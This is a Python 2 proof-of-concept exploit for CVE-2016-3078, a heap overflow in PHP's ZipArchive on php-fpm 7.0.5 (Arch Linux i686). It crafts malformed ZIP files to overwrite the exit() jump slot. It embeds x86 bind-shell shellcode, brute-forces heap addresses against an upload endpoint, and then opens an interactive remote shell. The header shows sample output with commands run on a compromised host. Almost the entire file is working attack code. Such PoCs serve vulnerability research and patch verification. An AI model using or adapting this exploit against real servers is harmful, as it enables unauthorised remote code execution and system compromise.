#!/usr/bin/env python2
#
# PoC for CVE-2016-3078 targeting Arch Linux i686 running php-fpm 7.0.5
# behind nginx.
#
# ,----
# | $ python exploit.py --bind-port 5555 http://1.2.3.4/upload.php
# | [*] this may take a while
# | [*] 103 of 4096 (0x67fd0)...
# | [+] connected to 1.2.3.4:5555
# |
# | id
# | uid=33(http) gid=33(http) groups=33(http)
# |
# | uname -a
# | Linux arch32 4.5.1-1-ARCH #1 SMP PREEMPT Thu Apr 14 19:36:01 CEST
# | 2016 i686 GNU/Linux
# |
# | pacman -Qs php-fpm
# | local/php-fpm 7.0.5-2
# |     FastCGI Process Manager for PHP
# |
# | cat upload.php
# | <?php
# | $zip = new ZipArchive();
# | if ($zip->open($_FILES["file"]["tmp_name"]) !== TRUE) {
# |     echo "cannot open archive\n";
# | } else {
# |     for ($i = 0; $i < $zip->numFiles; $i++) {
# |         $data = $zip->getFromIndex($i);
# |     }
# |     $zip->close();
# | }
# | ?>
# `----
#
# - Hans Jerry Illikainen
#
import os
import sys
import argparse
import socket
import urlparse
import collections
from struct import pack
from binascii import crc32

import requests

# bindshell from PEDA
shellcode = [
    "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
    "\x43\x52\x66\x68%(port)s\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
    "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
    "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
    "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    "\x89\xe1\xcd\x80"
]

# 100k runs had the zend_mm_heap mapped at 0xb6a00040 ~53.333% and at
# 0xb6c00040 ~46.667% of the time.
zend_mm_heap = [0xb6a00040, 0xb6c00040]

# offset to the payload from the zend heap
zend_mm_heap_offset = "0x%xfd0"

# Zend/zend_alloc_sizes.h
zend_mm_max_small_size = 3072

# exit()
R_386_JUMP_SLOT = 0x08960a48

ZipEntry = collections.namedtuple("ZipEntry", "name, data, size")


def zip_file_header(fname, data, size):
    return "".join([
        pack("<I", 0x04034b50),               # signature
        pack("<H", 0x0),                      # minimum version
        pack("<H", 0x0),                      # general purpose bit flag
        pack("<H", 0x0),                      # compression method
        pack("<H", 0),                        # last modification time
        pack("<H", 0),                        # last modification date
        pack("<I", crc32(data) & 0xffffffff), # crc-32
        pack("<I", len(data)),                # compressed size
        pack("<I", size),                     # uncompressed size
        pack("<H", len(fname)),               # filename length
        pack("<H", 0x0),                      # extra field length
        fname,                                # filename
        "",                                   # extra
        data                                  # compressed data
    ])


def zip_central_dir(offset, fname, data, size):
    return "".join([
        pack("<I", 0x02014b50),               # signature
        pack("<H", 0x0),                      # archive created with version
        pack("<H", 0x0),                      # archive requires version
        pack("<H", 0x0),                      # general purpose bit flag
        pack("<H", 0x0),                      # compression method
        pack("<H", 0),                        # last modification time
        pack("<H", 0),                        # last modification date
        pack("<I", crc32(data) & 0xffffffff), # crc-32
        pack("<I", len(data)),                # compressed size
        pack("<I", size),                     # uncompressed size
        pack("<H", len(fname)),               # filename length
        pack("<H", 0x0),                      # extra field length
        pack("<H", 0x0),                      # comment length
        pack("<H", 0x0),                      # disk number
        pack("<H", 0x0),                      # internal file attributes
        pack("<I", 0x0),                      # external file attributes
        pack("<I", offset),                   # offset of file header
        fname,                                # filename
        "",                                   # extra
        "",                                   # comment
    ])


def zip_central_dir_end(num, size, offset):
    return "".join([
        pack("<I", 0x06054b50), # signature
        pack("<H", 0x0),        # disk number
        pack("<H", 0x0),        # disk where central directory starts
        pack("<H", num),        # number of central directories on this disk
        pack("<H", num),        # total number of central directory records
        pack("<I", size),       # size of central directory
        pack("<I", offset),     # offset of central directory
        pack("<H", 0x0),        # comment length
        ""                      # comment
    ])


def zip_entries(addr, shellcode):
    if len(shellcode) > zend_mm_max_small_size:
        sys.exit("[-] shellcode is too big")

    size = 0xfffffffe
    length = 256
    entries = [ZipEntry("shellcode", shellcode, zend_mm_max_small_size)]
    for i in range(16):
        data = "A" * length
        if i == 0:
            data = pack("<I", (R_386_JUMP_SLOT - 0x10)) * (length / 4)
        elif i == 3:
            data = pack("<I", addr) + data[4:]
        entries.append(ZipEntry("overflow", data, size))
    return entries


def zip_create(entries):
    archive = []
    directories = []
    offset = 0
    for e in entries:
        file_header = zip_file_header(e.name, e.data, e.size)
        directories.append((e, offset))
        offset += len(file_header)
        archive.append(file_header)

    directories_length = 0
    for e, dir_offset in directories:
        central_dir = zip_central_dir(dir_offset, e.name, e.data, e.size)
        directories_length += len(central_dir)
        archive.append(central_dir)

    end = zip_central_dir_end(len(entries), directories_length, offset)
    archive.append(end)
    return "".join(archive)


def zip_send(url, archive):
    files = {"file": archive}
    try:
        req = requests.post(url, files=files, timeout=5)
    except requests.exceptions.ConnectionError:
        sys.exit("[-] failed to send archive")
    except requests.exceptions.Timeout:
        return

    return req.status_code


def connect(host, port):
    addr = socket.gethostbyname(host)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((addr, port))
    except socket.error:
        return

    print("\n[+] connected to %s:%d" % (host, port))
    if os.fork() == 0:
        while True:
            try:
                data = sock.recv(8192)
            except KeyboardInterrupt:
                sys.exit("\n[!] receiver aborting")
            if data == "":
                sys.exit("[!] receiver aborting")
            sys.stdout.write(data)
    else:
        while True:
            try:
                cmd = sys.stdin.readline()
            except KeyboardInterrupt:
                sys.exit("[!] sender aborting")
            sock.send(cmd)


def get_shellcode(port):
    p = pack(">H", port)
    if "\x00" in p:
        sys.exit("[-] encode your NUL-bytes")
    return "".join(shellcode) % {"port": p}


def get_args():
    p = argparse.ArgumentParser()
    p.add_argument("--tries", type=int, default=4096)
    p.add_argument("--bind-port", type=int, default=8000)
    p.add_argument("url", help="POST url")
    return p.parse_args()


def main():
    args = get_args()
    shellcode = get_shellcode(args.bind_port)
    host = urlparse.urlparse(args.url).netloc.split(":")[0]

    print("[*] this may take a while")
    for i in range(args.tries):
        offset = int(zend_mm_heap_offset % i, 16)
        sys.stdout.write("\r[*] %d of %d (0x%x)..." % (i, args.tries, offset))
        sys.stdout.flush()
        for heap in zend_mm_heap:
            archive = zip_create(zip_entries(heap + offset, shellcode))
            if zip_send(args.url, archive) == 404:
                sys.exit("\n[-] 404: %s" % args.url)
            connect(host, args.bind_port)
    print("\n[-] nope...")

if __name__ == "__main__":
    main()
